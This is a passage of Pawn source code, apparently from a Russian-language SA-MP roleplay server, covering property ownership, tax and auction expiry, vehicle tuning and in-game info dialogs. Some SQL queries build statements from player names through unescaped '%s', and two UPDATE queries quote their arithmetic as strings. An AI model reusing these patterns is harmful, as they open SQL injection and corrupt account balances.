		FarmInfo[null][fLandTax] = 0;
		FarmInfo[null][fBank] = 0;
		FarmInfo[null][fProds] = 0;
		FarmInfo[null][fZp] = 30;
		FarmInfo[null][fGrain_Price] = 5;
		FarmInfo[null][fGrain] = 0;
		FarmInfo[null][fGrain_Sown] = 0;
		FarmInfo[null][fProds_Selling] = 1;
		FarmInfo[null][fProds_Price] = 21;
	}
	format(string, sizeof(string), " Администратор %s удалил аккаунт %s", PlayerInfo[playerid][pName], stringg);
	ABroadCast(COLOR_LIGHTRED,string,7);
	printf("Администратор %s удалил аккаунт %s",Name(playerid), stringg);
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "DELETE FROM `"TABLE_ADMIN"` WHERE name = '%s'",stringg);
	mysql_function_query(DATABASE, QUERY, false, "", "");
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "DELETE FROM `"TABLE_CARS"` WHERE owner = '%s'",stringg);
	mysql_function_query(DATABASE, QUERY, false, "", "");
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "DELETE FROM `"TABLE_ACCOUNTS"` WHERE name = '%s'",stringg);
	return mysql_function_query(DATABASE, QUERY, false, "", "");
}
stock HGet(playerid)
{
	new house = 0;
	for(new i = 1; i <= TotalHouse;i++)
	{
		if(strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pName],false) == 0 && strcmp(HouseInfo[i][hOwner],"None",true) != 0) house++, PlayerInfo[playerid][pPHouseKey] = i;
	}
	return house;
}
stock BGet(playerid)
{
	new house = 0;
	for(new i = 1; i <= TotalBizz;i++)
	{
		if(strcmp(BizzInfo[i][bOwner],PlayerInfo[playerid][pName],false) == 0 && strcmp(BizzInfo[i][bOwner],"None",true) != 0) house++, PlayerInfo[playerid][pPBizzKey] = i;
	}
	return house;
}
stock WGet(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALSHOPS;i++)
	{
		if(strcmp(WorkshopInfo[i][wOwner],PlayerInfo[playerid][pName],false) == 0 && strcmp(WorkshopInfo[i][wOwner],"None",true) != 0) house++, SetPVarInt(playerid, "wShop", i);
	}
	return house;
}
stock KGet(playerid)
{
	new house = 0;
	for(new i = 1; i <= ALLKVARTIRI; i++)
	{
		if(strcmp(kvartinfo[i][vladelec],PlayerInfo[playerid][pName],false) == 0 && strcmp(kvartinfo[i][vladelec],"None",true) != 0) house++, PlayerInfo[playerid][pKvartiraKey] = i;
	}
	return house;
}
stock FGet(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALFARM; i++)
	{
		if(strcmp(FarmInfo[i][fOwner],PlayerInfo[playerid][pName],false) == 0 && strcmp(FarmInfo[i][fOwner],"None",true) != 0) house++, PlayerInfo[playerid][pPFarmKey] = i;
	}
	return house;
}
stock GetKvart()
{
	for(new k = 1; k <= ALLKVARTIRI; k++)
	{
		if(!strcmp(kvartinfo[k][vladelec],"None",true)) continue;
		if(kvartinfo[k][plata] < 100)
		{
			if(GetPlayerID(kvartinfo[k][vladelec]) != INVALID_PLAYER_ID) SetPVarInt(GetPlayerID(kvartinfo[k][vladelec]), "GetKvart", 1);
			kvartinfo[k][aptek] = 0;
			kvartinfo[k][lock] = 0;
			kvartinfo[k][plata] = 0;
			strmid(kvartinfo[k][vladelec], "None", 0, strlen("None"), 10);
			updatekvar(k);
		}
		else kvartinfo[k][plata]-=100;
	}
	return true;
}
stock GetBizz()
{
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(BizzInfo[i][bStavka] > 0 && strcmp(BizzInfo[i][bOwner],"None",true) == 0 && BizzInfo[i][bTimeStavka] > 0) BizzInfo[i][bTimeStavka]--;
		if(BizzInfo[i][bTimeStavka] == 0 && BizzInfo[i][bStavka] > 0)
		{
			mysql_format(DATABASE,QUERY,256,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",BizzInfo[i][bNameStavka]);
			mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",12,i,"");
		}
		if(strcmp(BizzInfo[i][bOwner],"None",true) != 0) continue;
		if(BizzInfo[i][bLandTax] < BizzLandTax[i] || BizzInfo[i][bLocked] == 1 && BizzInfo[i][bLockTime] > 12) ClearBizz(i);
		else
		{
			if(BizzInfo[i][bProducts] <= 0)
			{
				BizzInfo[i][bLocked] = 1;
				if(IsPlayerConnected(GetPlayerID(BizzInfo[i][bOwner])))
				{
					if(BizzInfo[i][bLockTime] == 0) SetPVarInt(GetPlayerID(BizzInfo[i][bOwner]), "_GetBizz_", 1);
				}
			}
			if(BizzInfo[i][bLocked] == 1)BizzInfo[i][bLockTime]++;
			if(BizzInfo[i][bLockTime] > 1 && BizzInfo[i][bLockTime] < 12)if(IsPlayerConnected(GetPlayerID(BizzInfo[i][bOwner]))) SetPVarInt(GetPlayerID(BizzInfo[i][bOwner]), "GetBizz_", 1);
			if(BizzInfo[i][bMafia] == 6) MafiaBank[0][nYakuza] += 500;
			if(BizzInfo[i][bMafia] == 14) MafiaBank[0][nRm] += 500;
			if(BizzInfo[i][bMafia] == 5) MafiaBank[0][nLcn] += 500;
		}
	}
	return true;
}
stock GetHome()
{
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(strcmp("None",HouseInfo[i][hOwner],true) == 0) continue;
		if(HouseInfo[i][hTakings] < GetHouseOplata(i))
		{
			if(GetPlayerID(HouseInfo[i][hOwner]) != INVALID_PLAYER_ID)
			{
				PlayerInfo[GetPlayerID(HouseInfo[i][hOwner])][pHousecash] += HouseInfo[i][hValue];
				SetPVarInt(GetPlayerID(HouseInfo[i][hOwner]), "GetHome", 1);
			}
			else
			{
				mysql_format(DATABASE,QUERY,300, "UPDATE "TABLE_ACCOUNTS"  SET pHousecash = 'pHousecash+%i', pText = '1' WHERE Name = '%s'",HouseInfo[i][hValue],HouseInfo[i][hOwner]);
				mysql_function_query(DATABASE, QUERY, true, "", "");
			}
			strmid(HouseInfo[i][hOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			HouseInfo[i][hTakings] = 0;
			HouseInfo[i][hLock] = 1;
			HouseInfo[i][hHel] = 0;
			for(new h = 0; h < 10; h++) HouseInfo[i][hSafe][h] = 0;
			BuyHouse(i);
		}
		else HouseInfo[i][hTakings] -= GetHouseOplata(i);
		robhouse[i] = false;
	}
	return true;
}
stock GetShop()
{
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(WorkshopInfo[i][wAuction][0] > 0 && strcmp(WorkshopInfo[i][wOwner],"None",true) == 0 && WorkshopInfo[i][wAuction][2] > 0) WorkshopInfo[i][wAuction][2]--;
		if(WorkshopInfo[i][wAuction][2] == 0 && WorkshopInfo[i][wAuction][0] > 0)
		{
			mysql_format(DATABASE,QUERY,256,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",WorkshopInfo[i][wAuctionName]);
			mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",24,i,"");
		}
		if(strcmp("None",WorkshopInfo[i][wOwner],true) == 0) continue;
		new null = WorkshopInfo[i][wAuction][4];
		if(WorkshopInfo[i][wLandTax] < 500 || (null < Now() && null != 0))
		{
			if(GetPlayerID(WorkshopInfo[i][wOwner]) != INVALID_PLAYER_ID)
			{
				if(null > Now()) SetPVarInt(GetPlayerID(WorkshopInfo[i][wOwner]), "GetShop", 1);
				PlayerInfo[GetPlayerID(WorkshopInfo[i][wOwner])][pBank] += WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax];
			}
			else
			{
				mysql_format(DATABASE,QUERY,300, "UPDATE "TABLE_ACCOUNTS"  SET pBank = 'pBank+%i' WHERE Name = '%s'",WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax],WorkshopInfo[i][wOwner]);
				mysql_function_query(DATABASE, QUERY, true, "", "");
			}
			strmid(WorkshopInfo[i][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[i][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[i][wAuction][0] = 0;
			WorkshopInfo[i][wAuction][1] = 0;
			WorkshopInfo[i][wAuction][2] = 0;
			WorkshopInfo[i][wAuction][3] = 0;
			WorkshopInfo[i][wAuction][4] = 0;
			WorkshopInfo[i][wLandTax] = 0;
			WorkshopInfo[i][wBank] = 0;
			WorkshopInfo[i][wProds] = 0;
			WorkshopInfo[i][wPriceProds] = 50;
			WorkshopInfo[i][wZp] = 5;
		}
		else
		{
			WorkshopInfo[i][wLandTax] -= 500;
			if(WorkshopInfo[i][wProds] < 20000 && WorkshopInfo[i][wBank] > 2*(20000-WorkshopInfo[i][wProds])) WorkshopInfo[i][wProds] = 20000, WorkshopInfo[i][wBank]-=2*(20000-WorkshopInfo[i][wProds]);
			WorkshopInfo[i][wBank] -= 4000;
			switch(WorkshopInfo[i][wBiker])
			{
				case 24:
				{
					FracBank[0][fHamc] += 4000;
				}
				case 26:
				{
					FracBank[0][fWmc] += 4000;
				}
				case 29:
				{
					FracBank[0][fPmc] += 4000;
				}
			}
		}
	}
	return true;
}
stock GetFarm()
{
	for(new i = 1; i <= TOTALFARM; i++)
	{
		if(FarmInfo[i][fAuction][0] > 0 && strcmp(FarmInfo[i][fOwner],"None",true) == 0 && FarmInfo[i][fAuction][2] > 0) FarmInfo[i][fAuction][2]--;
		if(FarmInfo[i][fAuction][2] == 0 && FarmInfo[i][fAuction][0] > 0)
		{
			mysql_format(DATABASE,QUERY,256,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",FarmInfo[i][fAuctionName]);
			mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",29,i,"");
		}
		if(strcmp("None",FarmInfo[i][fOwner],true) == 0) continue;
		new null = FarmInfo[i][fAuction][4];
		if(FarmInfo[i][fLandTax] < 500 || (null < Now() && null != 0))
		{
			if(GetPlayerID(FarmInfo[i][fOwner]) != INVALID_PLAYER_ID)
			{
				if(null > Now()) SetPVarInt(GetPlayerID(FarmInfo[i][fOwner]), "GetFarm", 1);
				PlayerInfo[GetPlayerID(FarmInfo[i][fOwner])][pBank] += FarmInfo[i][fBank]+FarmInfo[i][fLandTax];
			}
			else
			{
				mysql_format(DATABASE,QUERY,300, "UPDATE "TABLE_ACCOUNTS"  SET pBank = 'pBank+%i' WHERE Name = '%s'",FarmInfo[i][fBank]+FarmInfo[i][fLandTax],FarmInfo[i][fOwner]);
				mysql_function_query(DATABASE, QUERY, true, "", "");
			}
			strmid(FarmInfo[i][fOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[i][fDeputy_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[i][fDeputy_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[i][fDeputy_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			FarmInfo[i][fAuction][0] = 0;
			FarmInfo[i][fAuction][1] = 0;
			FarmInfo[i][fAuction][2] = 0;
			FarmInfo[i][fAuction][3] = 0;
			FarmInfo[i][fAuction][4] = 0;
			FarmInfo[i][fLandTax] = 0;
			FarmInfo[i][fBank] = 0;
			FarmInfo[i][fProds] = 0;
			FarmInfo[i][fZp] = 30;
			FarmInfo[i][fGrain_Price] = 5;
			FarmInfo[i][fGrain] = 0;
			FarmInfo[i][fGrain_Sown] = 0;
			FarmInfo[i][fProds_Selling] = 1;
			FarmInfo[i][fProds_Price] = 21;
		}
		else
		{
			FarmInfo[i][fLandTax] -= 500;
			FarmInfo[i][fBank] -= 4000;
            switch(FarmInfo[i][fBiker])
			{
				case 24:
				{
					FracBank[0][fHamc] += 4000;
				}
				case 26:
				{
					FracBank[0][fWmc] += 4000;
				}
				case 29:
				{
					FracBank[0][fPmc] += 4000;
				}
			}
		}
	}
	return true;
}
stock ShowDetals(playerid,targetid,idx)
{
	new dstirng[90],str[1500],count = 3;
	new till = WorkshopInfo[idx][wPriceProds];
	SetPVarInt(playerid,"installation_",targetid);
	strcat(str, "Услуга\tНазвание\tЦена\n");
	format(dstirng, sizeof(dstirng), "[0] Удалить тюнинг\n");
	strcat(str, dstirng);
	strcat(str,"[1] Ремонт двигателя\n");
	format(dstirng, sizeof(dstirng),"[2] Перекраска\t\t\"%i вирт\"\n",till*500);
	strcat(str,dstirng);
	
	for(new i;i<MAX_VEHICLE_COMPONENT;i++)
	{
		if(!IsVehicleUpgradeCompatible(GetVehicleModel(house_car[targetid]),AllTuningComponentsInfo[i][idcomp])) continue;
		format(dstirng, sizeof(dstirng), "[%i] %s\t\"%s\"\t\"%i вирт\"\n",count,AllTuningComponentsInfo[i][Type], AllTuningComponentsInfo[i][Name], till*AllTuningComponentsInfo[i][Cost]);
		strcat(str,dstirng);
		AwtomasMassiveID[playerid][count-3] = i;
		count++;
	}
	ShowPlayerDialogEx(playerid,6500,DIALOG_STYLE_TABLIST_HEADERS,"Доступные детали",str,"Далее","Закрыть");
	return 1;
}
stock GetFarmjob(playerid, idx)
{
	if(strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fDeputy_1],true) == 0 || strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fDeputy_2],true) == 0 || strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fDeputy_3],true) == 0) return 2;
	if(strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fFarmer_1],true) == 0 || strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fFarmer_2],true) == 0 || strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fFarmer_3],true) == 0
			|| strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fFarmer_4],true) == 0 || strcmp(PlayerInfo[playerid][pName],FarmInfo[idx][fFarmer_5],true) == 0) return true;
	return false;
}
stock GetWorkshop(playerid, idx)
{
	if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wDeputy1],true) == 0 || strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wDeputy2],true) == 0 || strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wDeputy3],true) == 0) return 2;
	if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wMechanic1],true) == 0 || strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wMechanic2],true) == 0 || strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wMechanic3],true) == 0
			|| strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wMechanic4],true) == 0 || strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wMechanic5],true) == 0) return true;
	return false;
}
stock GetWorkshopW(playerid, idx)
{
	if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[idx][wOwner],true) == 0) return true;
	return false;
}
stock LoadTuning(c,carid,index)
{
		if(CarInfo[c][carVehcom_1][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_1][index]);
		if(CarInfo[c][carVehcom_2][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_2][index]);
		if(CarInfo[c][carVehcom_3][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_3][index]);
		if(CarInfo[c][carVehcom_4][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_4][index]);
		if(CarInfo[c][carVehcom_5][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_5][index]);
		if(CarInfo[c][carVehcom_6][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_6][index]);
		if(CarInfo[c][carVehcom_7][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_7][index]);
		if(CarInfo[c][carVehcom_8][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_8][index]);
		if(CarInfo[c][carVehcom_9][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_9][index]);
		if(CarInfo[c][carVehcom_10][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_10][index]);
		if(CarInfo[c][carVehcom_11][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_11][index]);
		if(CarInfo[c][carVehcom_12][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_12][index]);
		if(CarInfo[c][carVehcom_13][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_13][index]);
		if(CarInfo[c][carVehcom_14][index]!=0) AddVehicleComponent(carid, CarInfo[c][carVehcom_14][index]);
}
stock SaveTuning(playerid,i)
{
	CarInfo[playerid][carVehcom_1][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_SPOILER);
	CarInfo[playerid][carVehcom_2][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_HOOD);
	CarInfo[playerid][carVehcom_3][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_ROOF);
	CarInfo[playerid][carVehcom_4][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_SIDESKIRT);
	CarInfo[playerid][carVehcom_5][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_LAMPS);
	CarInfo[playerid][carVehcom_6][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_NITRO);
	CarInfo[playerid][carVehcom_7][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_EXHAUST);
	CarInfo[playerid][carVehcom_8][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_WHEELS);
	CarInfo[playerid][carVehcom_9][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_STEREO);
	CarInfo[playerid][carVehcom_10][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_HYDRAULICS);
	CarInfo[playerid][carVehcom_11][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_FRONT_BUMPER);
	CarInfo[playerid][carVehcom_12][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_REAR_BUMPER);
	CarInfo[playerid][carVehcom_13][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_RIGHT);
	CarInfo[playerid][carVehcom_14][GetPVarInt(playerid, "chosencar")]=GetVehicleComponentInSlot(i, CARMODTYPE_VENT_LEFT);
}
stock RemoveTuning(c,carid)
{
	new s = GetPVarInt(c, "chosencar");
	if(CarInfo[c][carVehcom_1][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_1][s]), CarInfo[c][carVehcom_1][s] = 0;
	if(CarInfo[c][carVehcom_2][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_2][s]), CarInfo[c][carVehcom_2][s] = 0;
	if(CarInfo[c][carVehcom_3][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_3][s]), CarInfo[c][carVehcom_3][s] = 0;
	if(CarInfo[c][carVehcom_4][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_4][s]), CarInfo[c][carVehcom_4][s] = 0;
	if(CarInfo[c][carVehcom_5][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_5][s]), CarInfo[c][carVehcom_5][s] = 0;
	if(CarInfo[c][carVehcom_6][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_6][s]), CarInfo[c][carVehcom_6][s] = 0;
	if(CarInfo[c][carVehcom_7][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_7][s]), CarInfo[c][carVehcom_7][s] = 0;
	if(CarInfo[c][carVehcom_8][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_8][s]), CarInfo[c][carVehcom_8][s] = 0;
	if(CarInfo[c][carVehcom_9][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_9][s]), CarInfo[c][carVehcom_9][s] = 0;
	if(CarInfo[c][carVehcom_10][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_10][s]), CarInfo[c][carVehcom_10][s] = 0;
	if(CarInfo[c][carVehcom_11][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_11][s]), CarInfo[c][carVehcom_11][s] = 0;
	if(CarInfo[c][carVehcom_12][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_12][s]), CarInfo[c][carVehcom_12][s] = 0;
	if(CarInfo[c][carVehcom_13][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_13][s]), CarInfo[c][carVehcom_13][s] = 0;
	if(CarInfo[c][carVehcom_14][s]!=0) RemoveVehicleComponent(carid, CarInfo[c][carVehcom_14][s]), CarInfo[c][carVehcom_14][s] = 0;
}
stock WorkshopStats(playerid, idx)
{
	new str[768];
	format(YCMDstr,90," Автомастерская: %i\n",idx); strcat(str,YCMDstr);
	format(YCMDstr,90," Владелец: %s\n",WorkshopInfo[idx][wOwner]); strcat(str,YCMDstr);
	format(YCMDstr,90," Баланс банка: %i вирт\n",WorkshopInfo[idx][wBank]); strcat(str,YCMDstr);
	format(YCMDstr,90," Баланс счета 'LandTax': %i вирт\n",WorkshopInfo[idx][wLandTax]); strcat(str,YCMDstr);
	format(YCMDstr,90," Цена продукта: %i вирт\n",WorkshopInfo[idx][wPriceProds]); strcat(str,YCMDstr);
	format(YCMDstr,90," Продукта: %i / 20000\n",WorkshopInfo[idx][wProds]); strcat(str,YCMDstr);
	format(YCMDstr,90," Плата рабочим: %i процентов\n\n",WorkshopInfo[idx][wZp]); strcat(str,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n",WorkshopInfo[idx][wDeputy1]); strcat(str,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n",WorkshopInfo[idx][wDeputy2]); strcat(str,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n\n",WorkshopInfo[idx][wDeputy3]); strcat(str,YCMDstr);
	format(YCMDstr,90," Механик: %s\n",WorkshopInfo[idx][wMechanic1]); strcat(str,YCMDstr);
	format(YCMDstr,90," Механик: %s\n",WorkshopInfo[idx][wMechanic2]); strcat(str,YCMDstr);
	format(YCMDstr,90," Механик: %s\n",WorkshopInfo[idx][wMechanic3]); strcat(str,YCMDstr);
	format(YCMDstr,90," Механик: %s\n",WorkshopInfo[idx][wMechanic4]); strcat(str,YCMDstr);
	format(YCMDstr,90," Механик: %s\n",WorkshopInfo[idx][wMechanic5]); strcat(str,YCMDstr);
	return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX, "Информ. об Автомастерской",str, "Скрыть", "");
}
stock FarmStats(playerid, idx)
{
	new str[32];
	string = "";
	switch(FarmInfo[idx][fProds_Selling]) { case 1: str = "Картофель"; default: str = "Веселая трава"; }
	format(YCMDstr,90," Владелец: %s\n",FarmInfo[idx][fOwner]); strcat(string,YCMDstr);
	format(YCMDstr,90," Баланс банка: %i\n",FarmInfo[idx][fBank]); strcat(string,YCMDstr);
	format(YCMDstr,90," Баланс счета 'LandTax': %i\n",FarmInfo[idx][fLandTax]); strcat(string,YCMDstr);
	format(YCMDstr,90," Цена за работу: %i\n\n",FarmInfo[idx][fZp]); strcat(string,YCMDstr);
	format(YCMDstr,90," Цена зерна: %i\n",FarmInfo[idx][fGrain_Price]); strcat(string,YCMDstr);
	format(YCMDstr,90," Зерна закуплено: %i / 10000\n",FarmInfo[idx][fGrain]); strcat(string,YCMDstr);
	format(YCMDstr,90," Зерна засеяно: %i / 5000\n",FarmInfo[idx][fGrain_Sown]); strcat(string,YCMDstr);
	format(YCMDstr,90," Продаваемый продукт: %s\n",str); strcat(string,YCMDstr);
	format(YCMDstr,90," Количество на складе: %i / 10000\n",FarmInfo[idx][fProds]); strcat(string,YCMDstr);
	format(YCMDstr,90," Цена продукта: %i\n\n",FarmInfo[idx][fProds_Price]); strcat(string,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n",FarmInfo[idx][fDeputy_1]); strcat(string,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n",FarmInfo[idx][fDeputy_2]); strcat(string,YCMDstr);
	format(YCMDstr,90," Заместитель: %s\n\n",FarmInfo[idx][fDeputy_3]); strcat(string,YCMDstr);
	format(YCMDstr,90," Фермер: %s\n",FarmInfo[idx][fFarmer_1]); strcat(string,YCMDstr);
	format(YCMDstr,90," Фермер: %s\n",FarmInfo[idx][fFarmer_2]); strcat(string,YCMDstr);
	format(YCMDstr,90," Фермер: %s\n",FarmInfo[idx][fFarmer_3]); strcat(string,YCMDstr);
	format(YCMDstr,90," Фермер: %s\n",FarmInfo[idx][fFarmer_4]); strcat(string,YCMDstr);
	format(YCMDstr,90," Фермер: %s\n",FarmInfo[idx][fFarmer_5]); strcat(string,YCMDstr);
	return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX, "Информация о Ферме",string, "Скрыть", "");
}
stock FarmStatsPay(playerid, idx)
{
	string = "";
	format(YCMDstr,90,"{FFFFFF}Рабочих: {FFEA06}%i\n",FarmStatPayS[idx][0]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Фермеров: {FFEA06}%i\n",FarmStatPayS[idx][1]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Собрано урожая: {FFEA06}%i\n",FarmStatPayS[idx][2]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Доставлено урожая на склад: {FFEA06}%i\n",FarmStatPayS[idx][3]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Куплено зерна: {FFEA06}%i\n",FarmStatPayS[idx][4]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Продано урожая: {FFEA06}%i\n\n",FarmStatPayS[idx][5]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Потрачено на покупку зерна: {D80000}%i\n",FarmStatPayS[idx][6]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Зарплата рабочим и фермерам: {D80000}%i\n",FarmStatPayS[idx][7]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Заработано на продаже урожая: {55C713}%i\n\n",FarmStatPayS[idx][8]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Всего заработано: {55C713}%i\n",FarmStatPayS[idx][8]-(FarmStatPayS[idx][7]+FarmStatPayS[idx][6])); strcat(string,YCMDstr);
	return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX, "Статистика за прошлый час",string, "Закрыть", "");
}
stock FarmStatsDay(playerid, idx)
{
	string = "";
	format(YCMDstr,90,"{FFFFFF}Рабочих: {FFEA06}%i\n",FarmStatDay[idx][0]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Фермеров: {FFEA06}%i\n",FarmStatDay[idx][1]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Собрано урожая: {FFEA06}%i\n",FarmStatDay[idx][2]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Доставлено урожая на склад: {FFEA06}%i\n",FarmStatDay[idx][3]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Куплено зерна: {FFEA06}%i\n",FarmStatDay[idx][4]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Продано урожая: {FFEA06}%i\n\n",FarmStatDay[idx][5]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Потрачено на покупку зерна: {D80000}%i\n",FarmStatDay[idx][6]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Зарплата рабочим и фермерам: {D80000}%i\n",FarmStatDay[idx][7]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Заработано на продаже урожая: {55C713}%i\n\n",FarmStatDay[idx][8]); strcat(string,YCMDstr);
	format(YCMDstr,90,"{FFFFFF}Всего заработано: {55C713}%i\n",FarmStatDay[idx][8]-(FarmStatDay[idx][7]+FarmStatDay[idx][6])); strcat(string,YCMDstr);
	return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX, "Статистика за весь день",string, "Закрыть", "");
}
stock ShowHelpDialog(playerid, dialog)
{
	string = "";
	if(dialog+2 != 19) SetPVarInt(playerid, "help_dialog", dialog + 2);
	else SetPVarInt(playerid, "help_dialog", 2);
	switch(dialog)
	{
	case 0:
		{
			ShowPlayerDialogEx(playerid,1467,2,"Помощь","[1] Общение\n[2] Список игроков\n[3] Транспорт\n[4] Транспорт часть 2\n[5] Общее\n[6] Оружие и Убийство\n[7] Role Play\n[8] Первые шаги\n[9] Первые шаги часть 2\n[10] Первые шаги часть 3\n[11] Часовая зарплата\n[12] Зарплата фракции\n[13] Бизнес\n[14] Местность\n[15] Законопослушность\n[16] Дома\n[17] Дом часть 2","Далее","Выход");
			return SetPVarInt(playerid,"help_dialog", 1);
		}
	case 1:
		{
			strcat(string,"<< Общение >>\n\n");
			strcat(string,"Вы можете обращаться с другими игроками через чат в левом верхнем углу.\n");
